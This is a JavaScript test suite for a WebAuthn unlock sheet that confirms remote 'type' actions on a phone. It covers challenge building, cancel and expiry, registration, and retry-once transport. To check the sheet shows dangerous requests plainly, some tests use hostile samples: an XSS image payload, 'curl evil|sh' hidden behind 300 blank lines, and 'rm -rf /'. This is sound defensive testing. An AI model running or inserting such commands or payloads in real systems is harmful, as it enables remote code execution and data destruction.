// The unlock sheet's logic (R11, docs/bridge-protocol.md section 9): the challenge the device builds, the sheet's states, one
// sheet at a time, a refused request retried exactly once and only after the person confirmed. The DOM parts (text only,
// delayed trusted click) are in tests/browser/test_unlock.py. tests/js/unlock-mutations.sh points UNLOCK_JS_DIR at a
// mutated copy of fileshare/static/js and every test here must still be able to fail.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";

const JS = process.env.UNLOCK_JS_DIR ? pathToFileURL(process.env.UNLOCK_JS_DIR + "/") : new URL("../../fileshare/static/js/", import.meta.url);
const C = await import(new URL("crypto.js", JS));
const U = await import(new URL("unlock.js", JS));
const T = await import(new URL("remote-transport.js", JS));

const VEC = JSON.parse(readFileSync(new URL("../bridge_vectors.json", import.meta.url), "utf8"));
const I = VEC.assertion.challenge_inputs;
const { hexToBytes: hex, bytesToHex, b64u, unb64u } = C;
const CRED = Uint8Array.from({ length: 16 }, (_, i) => i + 1);
const te = new TextEncoder();

function session(extra = {}) {
  return { workspace: I.workspace, deviceIdBytes: hex(I.device), offsetMs: 0, credentialId: b64u(CRED), ...extra };
}
const refusal = (extra = {}, code = "assertion_required") => ({ code, rid: I.rid, meta: { purpose: code === "lease_required" ? "lease" : "fresh", scope: I.scope,
  expires_ms: I.expires_ms, nonce: I.nonce, subject: { ...I.subject }, ...extra } });
const NOW = I.expires_ms - 60_000;

// A window whose authenticator signs nothing real but answers like one: clientDataJSON carries the challenge it was given.
function win({ fail = null, credential = CRED, echo = null, type = "webauthn.get" } = {}) {
  const w = { gets: [] };
  w.top = w.self = w;
  w.navigator = { credentials: { async get(o) {
    w.gets.push(o);
    if (fail) throw Object.assign(new Error("x"), { name: fail });
    const challenge = echo ?? o.publicKey.challenge;
    return { rawId: credential.buffer.slice(0), response: { authenticatorData: new Uint8Array([1, 2, 3]),
      clientDataJSON: te.encode(JSON.stringify({ type, challenge: b64u(new Uint8Array(challenge)), origin: "https://x" })), signature: new Uint8Array([4, 5]) } };
  } } };
  return w;
}

// A sheet that only records: tests click by calling the spec's own handlers.
function sheets() {
  const log = { drawn: [], closed: 0 };
  log.draw = (spec) => { log.drawn.push(spec); return { close() { log.closed++; } }; };
  return log;
}
const ask = (s, r, w, log, extra = {}) => U.askAssertion(s, r, { win: w, now: () => NOW, draw: log.draw, delayMs: 0, ...extra });
const tick = () => new Promise((r) => setTimeout(r, 5));
const drawn = async (log, n = 1) => { for (let i = 0; i < 200 && log.drawn.length < n; i++) await tick(); };

test("the challenge is rebuilt from the host's parts, equals the vector, and is asked for with user verification required", async () => {
  const w = win(), log = sheets();
  const p = ask(session(), refusal(), w, log);
  await drawn(log);
  assert.equal(log.drawn.length, 1);
  assert.equal(w.gets.length, 0);                                   // nothing is asked of the authenticator before the click
  log.drawn[0].onConfirm();
  const r = await p;
  const o = w.gets[0].publicKey;
  assert.equal(bytesToHex(new Uint8Array(o.challenge)), VEC.assertion.challenge);
  assert.equal(o.userVerification, "required");
  assert.deepEqual(o.allowCredentials.map((c) => [...new Uint8Array(c.id)]), [[...CRED]]);
  assert.equal(r.ok, true);
  assert.equal(r.meta.op, "assert");
  assert.equal(r.meta.for, I.rid);
  assert.equal(r.meta.credential_id, b64u(CRED));
  assert.deepEqual(Object.keys(r.meta).sort(), ["authenticator_data", "client_data_json", "credential_id", "for", "op", "signature"]);
  assert.equal(log.closed, 1);
});

test("a lease challenge is purpose 2", async () => {
  const w = win(), log = sheets();
  const lease = { kind: "lease", shown: "Type for 15 minutes", digest: "" };
  const p = ask(session(), refusal({ subject: lease }, "lease_required"), w, log);
  await drawn(log);
  log.drawn[0].onConfirm();
  assert.equal((await p).ok, true);
  assert.equal(bytesToHex(new Uint8Array(w.gets[0].publicKey.challenge)), VEC.assertion.lease_challenge);
  assert.match(log.drawn[0].title, /15 minutes/);
});

test("the sheet shows exactly the host's text, the scope, the expiry and the digest to compare", async () => {
  const log = sheets();
  const p = ask(session(), refusal(), win(), log);
  await drawn(log);
  const s = log.drawn[0];
  assert.equal(s.text, I.subject.shown);
  assert.ok(s.facts.some((f) => f.includes("type")) && s.facts.some((f) => f.includes("Expires")));
  assert.ok(s.facts.some((f) => f.includes(I.subject.digest.slice(0, 8))));
  assert.ok(s.facts.some((f) => /never your passphrase/i.test(f)));
  s.onCancel();
  await p;
});

test("a hostile subject is passed on as the very same string (the DOM draws it as text), and is what the challenge covers", async () => {
  const hostile = '<img src=x onerror="alert(1)">';
  const w = win(), log = sheets();
  const p = ask(session(), refusal({ subject: { kind: "action", shown: hostile, digest: "" } }), w, log);
  await drawn(log);
  assert.equal(log.drawn[0].text, hostile);
  log.drawn[0].onConfirm();
  await p;
  const B = await import(new URL("bridge-crypto.js", JS));
  const want = await B.assertionChallenge({ workspace: hex(I.workspace), deviceId: hex(I.device), rid: hex(I.rid), purpose: "fresh", scope: I.scope,
    expiresMs: I.expires_ms, nonce: hex(I.nonce), subject: { kind: "action", shown: hostile, digest: "" } });
  assert.deepEqual(new Uint8Array(w.gets[0].publicKey.challenge), want);
});

test("cancel resolves cancelled, closes the sheet and never touches the authenticator", async () => {
  const w = win(), log = sheets();
  const p = ask(session(), refusal(), w, log);
  await drawn(log);
  log.drawn[0].onCancel();
  assert.deepEqual(await p, { ok: false, reason: "cancelled" });
  assert.equal(w.gets.length, 0);
  assert.equal(log.closed, 1);
});

test("an authenticator that refuses (no user verification, dismissed) is cancelled; anything else failed; the sheet closes", async () => {
  for (const [name, reason] of [["NotAllowedError", "cancelled"], ["AbortError", "cancelled"], ["SecurityError", "failed"]]) {
    const log = sheets();
    const p = ask(session(), refusal(), win({ fail: name }), log);
    await drawn(log);
    log.drawn[0].onConfirm();
    assert.deepEqual(await p, { ok: false, reason });
    assert.equal(log.closed, 1);
  }
});

test("only one sheet at a time: a second ask while one is open is busy, and a later one works again", async () => {
  const log = sheets();
  const first = ask(session(), refusal(), win(), log);
  await drawn(log);
  assert.deepEqual(await ask(session(), refusal(), win(), log), { ok: false, reason: "busy" });
  assert.equal(log.drawn.length, 1);
  log.drawn[0].onCancel();
  await first;
  const third = ask(session(), refusal(), win(), log);
  await drawn(log, 2);
  assert.equal(log.drawn.length, 2);
  log.drawn[1].onCancel();
  await third;
});

test("the sheet expires with the challenge: nothing is asked after it, and an already expired one is not even drawn", async () => {
  const log = sheets(), w = win();
  const r = await U.askAssertion(session(), refusal(), { win: w, now: () => I.expires_ms - 20, draw: log.draw, delayMs: 0 });
  assert.deepEqual(r, { ok: false, reason: "expired" });
  assert.equal(log.drawn.length, 1);
  assert.equal(log.closed, 1);
  const late = await U.askAssertion(session(), refusal(), { win: w, now: () => I.expires_ms + 1, draw: log.draw, delayMs: 0 });
  assert.deepEqual(late, { ok: false, reason: "expired" });
  assert.equal(log.drawn.length, 1);
  assert.equal(w.gets.length, 0);
});

test("the host's clock offset is applied to the expiry", async () => {
  const log = sheets();
  const r = await U.askAssertion(session({ offsetMs: 500 }), refusal(), { win: win(), now: () => I.expires_ms - 400, draw: log.draw, delayMs: 0 });
  assert.deepEqual(r, { ok: false, reason: "expired" });       // 500 ms ahead: already over on the device's clock
  assert.equal(log.drawn.length, 0);
});

test("a refusal this app cannot read is not asked about; no credential means no sheet", async () => {
  const bad = [
    refusal({ purpose: "lease" }),                                     // code and purpose disagree
    refusal({ scope: "root" }), refusal({ nonce: "00" }), refusal({ expires_ms: "soon" }),
    refusal({ subject: { kind: "nope", shown: "x", digest: "" } }), refusal({ subject: { kind: "action", shown: "x", digest: "XYZ" } }),
    { ...refusal(), rid: "zz" }, { ...refusal(), code: "revoked" },
  ];
  for (const r of bad) {
    const log = sheets();
    assert.deepEqual(await ask(session(), r, win(), log), { ok: false, reason: "bad_request" });
    assert.equal(log.drawn.length, 0);
  }
  const log = sheets();
  assert.deepEqual(await ask(session({ credentialId: null }), refusal(), win(), log), { ok: false, reason: "no_credential" });
  assert.equal(log.drawn.length, 0);
});

test("an answer for another challenge, or from another credential, or without WebAuthn, is a failure", async () => {
  for (const w of [win({ echo: new Uint8Array(32) }), win({ type: "webauthn.create" }), win({ credential: Uint8Array.from({ length: 16 }, () => 9) })]) {
    const log = sheets();
    const p = ask(session(), refusal(), w, log);
    await drawn(log);
    log.drawn[0].onConfirm();
    assert.deepEqual(await p, { ok: false, reason: "failed" });
  }
  assert.deepEqual(await ask(session(), refusal(), { navigator: {} }, sheets()), { ok: false, reason: "failed" });
});

test("every failure has a fixed sentence and none of them is the passphrase", () => {
  for (const r of ["cancelled", "expired", "failed", "busy", "no_credential", "bad_request", "no_platform", "refused"]) {
    assert.ok(U.unlockText(r).length > 10);
    assert.doesNotMatch(U.unlockText(r), /enter your passphrase/i);
  }
  assert.equal(U.unlockText("whatever"), U.UNLOCK_TEXT.failed);
  assert.match(U.unlockText("no_platform"), /cannot get Type/);
});

// ---- registration at pairing ---------------------------------------------------------------------------------------

test("registration: begin, then the person's click, then the credential, then finish; no platform authenticator means no begin", async () => {
  const sent = [], order = [];
  const w = { top: null, PublicKeyCredential: { isUserVerifyingPlatformAuthenticatorAvailable: async () => true } };
  w.top = w.self = w;
  w.navigator = { credentials: { async create(o) {
    order.push("create");
    assert.equal(o.publicKey.authenticatorSelection.userVerification, "required");
    assert.equal(o.publicKey.authenticatorSelection.authenticatorAttachment, "platform");
    assert.equal(o.publicKey.attestation, "none");
    assert.deepEqual(o.publicKey.pubKeyCredParams, [{ type: "public-key", alg: -7 }]);
    assert.equal(bytesToHex(new Uint8Array(o.publicKey.challenge)), VEC.assertion.registration_challenge.challenge);
    return { rawId: CRED.buffer.slice(0), response: { attestationObject: new Uint8Array([7]).buffer, clientDataJSON: new Uint8Array([8]).buffer } };
  } } };
  const rc = VEC.assertion.registration_challenge;
  const send = async (m) => { sent.push(m.op); order.push(m.op); return m.op === "credential_begin" ? { nonce: rc.nonce, expires_ms: rc.expires_ms } : { registered: true, synced: true }; };
  const r = await U.registerCredential({ session: session(), label: "Phone", send, gate: async () => { order.push("click"); }, win: w });
  assert.deepEqual(r, { ok: true, credentialId: b64u(CRED), synced: true });
  assert.deepEqual(sent, ["credential_begin", "credential_finish"]);
  assert.deepEqual(order, ["click", "credential_begin", "create", "credential_finish"]);      // nothing asked of the host before the click
  const none = await U.registerCredential({ session: session(), label: "P", send: async () => assert.fail("asked the host"), win: { PublicKeyCredential: { isUserVerifyingPlatformAuthenticatorAvailable: async () => false } } });
  assert.deepEqual(none, { ok: false, reason: "no_platform" });
  const refused = await U.registerCredential({ session: session(), label: "P", send: async () => null, win: w });
  assert.deepEqual(refused, { ok: false, reason: "refused" });
  const slow = await U.registerCredential({ session: session(), label: "P", send: async () => assert.fail("asked the host before the click"), win: w,
    gate: async () => { throw Object.assign(new Error("late"), { name: "TimeoutError" }); } });
  assert.deepEqual(slow, { ok: false, reason: "timeout" });
  assert.match(U.unlockText("timeout"), /took too long/);
});

// ---- the transport: ask once, send the proof once ---------------------------------------------------------------------

function rig(script) {
  let n = 0;
  const posted = [];
  const sess = {
    pending: new Map(), requests: [],
    async request(args) { const id = (++n).toString(16).padStart(32, "0"); this.requests.push(structuredClone({ meta: args.meta, flags: args.flags })); return { id, envelope: new Uint8Array([n]) }; },
    retry: () => new Uint8Array([9]), expire() {},
    async receive() { return script.shift()(); },
  };
  const mailbox = {
    async post(id, env, stream, listener) { posted.push(id); queueMicrotask(() => listener.chunk({ env: new Uint8Array(1), mailbox: { id, idx: 0, last: true, stream: false } })); },
    async cancel() {}, close() {},
  };
  return { session: sess, mailbox, posted };
}
const need = (code = "assertion_required") => () => ({ result: "accept", rid: "x", last: true, refusal: true, meta: { refusal: code, purpose: "fresh", scope: "type", expires_ms: 1, nonce: "0".repeat(64), subject: { kind: "action", shown: "s", digest: "" } }, data: new Uint8Array(0) });
const ok = () => ({ result: "accept", rid: "x", last: true, refusal: false, meta: { status: 200, headers: {}, page: true }, data: new TextEncoder().encode("done") });
const REQ = { method: "POST", path: "/type", headers: {}, body: te.encode("ls"), stream: false, signal: new AbortController().signal };
const collect = async (it) => { const out = []; for await (const e of it) out.push(e); return out; };

test("a refusal for an assertion asks once; the confirmed proof is sent once as the assert request, and its answer is the result", async () => {
  const r = rig([need(), ok]);
  const asked = [];
  const unlock = async (s, rf) => { asked.push(rf); return { ok: true, meta: { op: "assert", for: rf.rid } }; };
  const ev = await collect(T.bridgeTransport({ ...r, unlock }).request(REQ));
  assert.deepEqual(ev.map((e) => e.type), ["head", "chunk", "end"]);
  assert.equal(asked.length, 1);
  assert.equal(asked[0].code, "assertion_required");
  assert.equal(asked[0].rid, r.posted[0]);                           // the proof is for the request that was refused
  assert.equal(r.session.requests.length, 2);
  assert.equal(r.session.requests[1].meta.op, "assert");
  assert.notEqual(r.posted[0], r.posted[1]);                         // a new request id
});

test("a second refusal for an assertion is not asked about again: the fixed text, no third request", async () => {
  const r = rig([need(), need("lease_required")]);
  let asked = 0;
  const seen = [];
  await assert.rejects(collect(T.bridgeTransport({ ...r, unlock: async () => { asked++; return { ok: true, meta: { op: "assert" } }; }, onRefusal: (c, t) => seen.push(c) }).request(REQ)),
    (e) => e.code === "lease_required");
  assert.equal(asked, 1);
  assert.equal(r.session.requests.length, 2);
  assert.deepEqual(seen, ["lease_required"]);
});

test("a cancelled or failed sheet sends nothing more and says its fixed sentence", async () => {
  for (const reason of ["cancelled", "failed", "expired", "busy"]) {
    const r = rig([need()]);
    const seen = [];
    await assert.rejects(collect(T.bridgeTransport({ ...r, unlock: async () => ({ ok: false, reason }), onRefusal: (c, t) => seen.push(t) }).request(REQ)),
      (e) => e.message === U.unlockText(reason));
    assert.equal(r.session.requests.length, 1);
    assert.deepEqual(seen, [U.unlockText(reason)]);
  }
});

test("without an unlock the refusal is only said, and nothing is sent again", async () => {
  const r = rig([need()]);
  await assert.rejects(collect(T.bridgeTransport(r).request(REQ)), (e) => e.code === "assertion_required");
  assert.equal(r.session.requests.length, 1);
});

test("the proof for a request is never sent unless the sheet resolved ok (no silent retry)", async () => {
  const r = rig([need(), ok]);
  let release;
  const gate = new Promise((res) => { release = res; });
  const p = collect(T.bridgeTransport({ ...r, unlock: async () => { await gate; return { ok: true, meta: { op: "assert" } }; } }).request(REQ));
  await tick(); await tick();
  assert.equal(r.session.requests.length, 1);                        // waiting for the person
  release();
  await p;
  assert.equal(r.session.requests.length, 2);
});

// ---- a text that is padded, long, or a different scope and clock ---------------------------------------------------------

const subj = (shown) => ({ kind: "action", shown, digest: "" });
const PAD = "git status" + "\n".repeat(300) + "curl evil|sh";

test("a subject padded with empty lines cannot push its tail out of view: one marker, the size, the end shown apart", async () => {
  const log = sheets();
  const p = ask(session(), refusal({ subject: subj(PAD) }), win(), log);
  await drawn(log);
  const s = log.drawn[0];
  assert.equal(s.text, "git status\n" + U.BLANKS + "\ncurl evil|sh");
  assert.equal(s.tail, s.text);                                          // short enough to show whole at the end
  assert.ok(s.facts[0].startsWith("3 lines, "), s.facts[0]);
  assert.ok(s.text.length < 100);
  s.onCancel();
  await p;
});

test("the end of a long text is shown apart, and the first fact states the size", async () => {
  const text = Array.from({ length: 30 }, (_, i) => `line ${i}`).join("\n") + "\nrm -rf /";
  const log = sheets();
  const p = ask(session(), refusal({ subject: subj(text) }), win(), log);
  await drawn(log);
  assert.equal(log.drawn[0].text, text);
  assert.ok(log.drawn[0].tail.endsWith("rm -rf /") && log.drawn[0].tail.length <= U.TAIL_CHARS);
  assert.match(log.drawn[0].facts[0], /^31 lines, \d+ characters$/);
  log.drawn[0].onCancel();
  await p;
});

test("what is still too long after collapsing is refused, nothing is drawn, and the sentence is fixed", async () => {
  for (const shown of ["a".repeat(2001), Array.from({ length: 41 }, (_, i) => "l" + i).join("\n"),
    Array.from({ length: 200 }, () => "x\n\ny").join("\n")]) {
    const log = sheets();
    const w = win();
    const r = await ask(session(), refusal({ subject: subj(shown) }), w, log);
    assert.deepEqual(r, { ok: false, reason: "bad_request", text: "The computer sent a request that is too long to check on this phone." });
    assert.equal(log.drawn.length, 0);
    assert.equal(w.gets.length, 0);
  }
  const edge = sheets();                                                  // exactly at the limits is fine
  const p = ask(session(), refusal({ subject: subj("a".repeat(2000)) }), win(), edge);
  await drawn(edge);
  edge.drawn[0].onCancel();
  assert.equal((await p).reason, "cancelled");
});

test("a normal short subject reaches the sheet unchanged, with no tail line", async () => {
  const log = sheets();
  const p = ask(session(), refusal(), win(), log);
  await drawn(log);
  assert.equal(log.drawn[0].text, I.subject.shown);
  assert.equal(log.drawn[0].tail, "");
  log.drawn[0].onCancel();
  await p;
  assert.deepEqual(U.inspectText("a\n\nb"), { text: "a\n\nb", lines: 3, chars: 4, tail: "a\n\nb", ok: true });
});

test("an abort closes the sheet, resolves cancelled and frees the next ask", async () => {
  const log = sheets(), ac = new AbortController();
  const p = ask(session(), refusal(), win(), log, { signal: ac.signal });
  await drawn(log);
  assert.equal(U.sheetOpen(), true);
  ac.abort();
  assert.deepEqual(await p, { ok: false, reason: "cancelled" });
  assert.equal(log.closed, 1);
  assert.equal(U.sheetOpen(), false);
  const gone = new AbortController(); gone.abort();
  assert.deepEqual(await ask(session(), refusal(), win(), log, { signal: gone.signal }), { ok: false, reason: "cancelled" });
  assert.equal(log.drawn.length, 1);
});

test("the transport hands its abort signal to the sheet, so a rebuilt frame closes it", async () => {
  const r = rig([need()]);
  const ac = new AbortController();
  let got = null;
  const unlock = (s, rf, opts) => new Promise((res) => { got = opts.signal; opts.signal.addEventListener("abort", () => res({ ok: false, reason: "cancelled" })); });
  const p = collect(T.bridgeTransport({ ...r, unlock }).request({ ...REQ, signal: ac.signal }));
  await tick(); await tick();
  assert.ok(got);
  ac.abort();
  assert.deepEqual(await p, []);
  assert.equal(r.session.requests.length, 1);
});

test("a host clock that differs from this device's moves the expiry but not the challenge", async () => {
  const log = sheets(), w = win();
  const s = session({ offsetMs: -2000 });                                 // the host is 2 s behind this device
  const p = U.askAssertion(s, refusal(), { win: w, now: () => I.expires_ms + 500, draw: log.draw, delayMs: 0 });
  await drawn(log);                                                       // 500 ms after the host's expiry on the device's clock, still open
  log.drawn[0].onConfirm();
  assert.equal((await p).ok, true);
  assert.equal(bytesToHex(new Uint8Array(w.gets[0].publicKey.challenge)), VEC.assertion.challenge);   // the host's expires_ms, as sent
  const late = await U.askAssertion(session({ offsetMs: 2000 }), refusal(), { win: w, now: () => I.expires_ms - 1000, draw: log.draw, delayMs: 0 });
  assert.deepEqual(late, { ok: false, reason: "expired" });
});

test("the challenge uses the scope the host named, not a fixed one", async () => {
  const B = await import(new URL("bridge-crypto.js", JS));
  for (const scope of ["look", "decide", "operate"]) {
    const w = win(), log = sheets();
    const p = ask(session(), refusal({ scope }), w, log);
    await drawn(log);
    log.drawn[0].onConfirm();
    await p;
    const want = await B.assertionChallenge({ workspace: hex(I.workspace), deviceId: hex(I.device), rid: hex(I.rid), purpose: "fresh", scope,
      expiresMs: I.expires_ms, nonce: hex(I.nonce), subject: I.subject });
    assert.notEqual(bytesToHex(want), VEC.assertion.challenge);
    assert.deepEqual(new Uint8Array(w.gets[0].publicKey.challenge), want);
    assert.match(log.drawn[0].facts.join(" "), new RegExp(`Needs: ${scope}`));
  }
});
